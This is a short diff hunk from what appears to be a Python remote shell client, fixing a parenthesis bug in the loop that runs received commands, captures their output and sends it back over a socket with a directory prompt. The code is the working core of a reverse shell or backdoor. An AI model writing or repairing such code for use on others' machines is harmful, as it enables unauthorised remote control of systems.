@@ -52,7 +52,7 @@ def receive_commands():
                 output_bytes = cmd.stdout.read() + cmd.stderr.read()
                 output_str = str(output_bytes, "utf-8")
                 sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
-                s.send(struct.pack('>I', len(sent_message) + sent_message)
+                s.send(struct.pack('>I', len(sent_message)) + sent_message)
                 print(output_str)
             except:
                 output_str = "Command not recognized" + "\n"
